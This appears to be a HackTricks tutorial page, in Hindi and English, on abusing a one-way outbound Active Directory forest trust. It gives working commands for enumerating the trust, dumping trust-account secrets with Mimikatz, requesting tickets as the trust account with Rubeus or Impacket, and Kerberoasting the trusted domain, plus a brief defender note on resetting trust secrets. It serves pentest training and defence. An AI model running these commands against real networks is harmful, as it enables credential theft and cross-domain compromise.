# बाहरी Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

इस scenario में **आपका domain** कुछ **privileges** को **different domain/forest** के principals के लिए **trust** कर रहा है।

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
यदि आपके पास AD module उपलब्ध है, तो **Trusted Domain Object (TDO)** को सीधे भी inspect करें। इससे आपको raw LDAP-backed trust data मिलता है जिसकी आपको बाद में जरूरत होगी जब आप यह तय करेंगे कि आसान path **FSP/group abuse** है या **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
आपको यह भी enumerate करना चाहिए कि `CN=ForeignSecurityPrincipals` से foreign principals को वास्तव में कहाँ access दिया गया था। Common wins हैं:

- आपके current domain में किसी server/DC पर **Local admin**
- किसी **custom domain group** में membership, जिसके पास users/computers/GPOs पर ACLs हों
- **computer objects** को modify करने के rights, जो बाद में trust configuration अनुमति दे तो [RBCD](resource-based-constrained-delegation.md) बन सकते हैं

## Trust Account Attack

जब domain/forest **B** से domain/forest **A** (**B trusts A**) की ओर एक one-way trust बनाया जाता है, तो **A** में **B** के लिए एक **trust account** बनाया जाता है। **A** के outbound-trust view में यह उपयोगी है क्योंकि अगर आप बाद में **B** (trusting side) को compromise कर लेते हैं, तो आप वहाँ से trust secret dump कर सकते हैं और वापस **A** में `B$` के रूप में authenticate कर सकते हैं।

यहाँ समझने योग्य critical aspect यह है कि इस trust account के password और Kerberos material को **trusting** domain में किसी Domain Controller से इस तरह extract किया जा सकता है:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
यह इसलिए काम करता है क्योंकि **trusted** डोमेन में बनाया गया trust account एक enabled principal होता है, जिसे वहाँ एक normal domain user के baseline rights मिलते हैं। यह अक्सर LDAP enumerate करने, tickets request करने, और अगला escalation path ढूँढने के लिए पर्याप्त होता है।

ऐसी scenario में जहाँ `ext.local` **trusting** डोमेन है और `root.local` **trusted** डोमेन है, `root.local` के अंदर `EXT$` नाम का एक user account बनाया जाता है। `ext.local` से trust keys dump करने पर ऐसे credentials मिलते हैं जिन्हें `root.local` के खिलाफ `root.local\EXT$` के रूप में इस्तेमाल किया जा सकता है:
```bash
lsadump::trust /patch
```
इसके बाद, निकाले गए **RC4** key का उपयोग `root.local\EXT$` के रूप में `root.local` के अंदर authenticate करने के लिए करें:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
फिर trusted domain को उस principal के रूप में enumerate करें, उदाहरण के लिए `root.local` में किसी high-value SPN को Kerberoasting करके:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Linux से

यदि आपने **RC4** trust-account key रिकवर कर ली है, तो वही idea Linux से Impacket के साथ काम करता है:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
अगर **RC4** स्वीकार नहीं किया जाता, तो recovered **cleartext password** (या derived **AES** keys) पर fall back करें और उस foothold से usual [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) और [Kerberoast](kerberoast.md) workflows reuse करें।

### Key material gotchas

**trust keys** और **trust-account credentials** को mix up न करें:

- एक one-way trust में, दोनों sides एक **TDO** store करते हैं, लेकिन actual **`EXT$` user account केवल trusted domain में मौजूद होता है**।
- current trust-account password TDO trust secret (`NewPassword` / current trust key) में reflected होता है।
- **RC4** trust key, trust account के रूप में `asktgt` के लिए reuse करने वाला सबसे आसान artifact है; default setups में यह usually working enctype होता है क्योंकि trust account के पास अक्सर blank `msDS-SupportedEncryptionTypes` होता है।
- अगर आप **AES trust keys** के बारे में सोच रहे हैं, याद रखें कि वे trust-account AES keys के साथ interchangeable नहीं हैं क्योंकि salts अलग होते हैं।

इस page की technique के लिए, इसलिए dumped **RC4** material या recovered **cleartext** password में से किसी एक को prefer करें।

### Gathering cleartext trust password

पिछले flow में **cleartext password** की बजाय trust hash का उपयोग किया गया था (जो **mimikatz** द्वारा भी **dumped** होता है)।

cleartext password को mimikatz के \[ CLEAR ] output को hexadecimal से convert करके और null bytes `\x00` हटाकर प्राप्त किया जा सकता है:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

कभी-कभी trust relationship बनाते समय, trust के लिए user को password टाइप करना पड़ता है। इस demonstration में, key original trust password है और इसलिए human readable है। जैसे-जैसे key rotate होती है (default: हर 30 days), cleartext आमतौर पर human readable रहना बंद कर देगा, लेकिन technically still usable रहेगा।

cleartext password का उपयोग trust account के रूप में regular authentication करने के लिए किया जा सकता है, trust account के Kerberos secret key के साथ TGT request करने के alternative के रूप में। यहाँ, `ext.local` से `root.local` को `Domain Admins` के members के लिए query करना:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts awkward principals होते हैं। **RUNAS / console / RDP** जैसे interactive logons यहाँ expected path नहीं हैं, और **NTLM** authentication attempts `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` के साथ fail हो सकते हैं। इसके बजाय **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) के लिए plan करें।

### Persistence / cleanup note

अगर defenders को पता चल जाए कि trusting domain compromise हुआ था, तो उन्हें **दोनों sides** पर `netdom trust ... /resetOneSide ...` के साथ trust secret rotate करना चाहिए। Operator perspective से यह इसलिए matter करता है क्योंकि एक **manual reset पुराने trust material को तुरंत invalid कर देता है**, जबकि normal trust-password rotation rollover के दौरान current/previous values को साथ रखती है।
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## सन्दर्भ

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
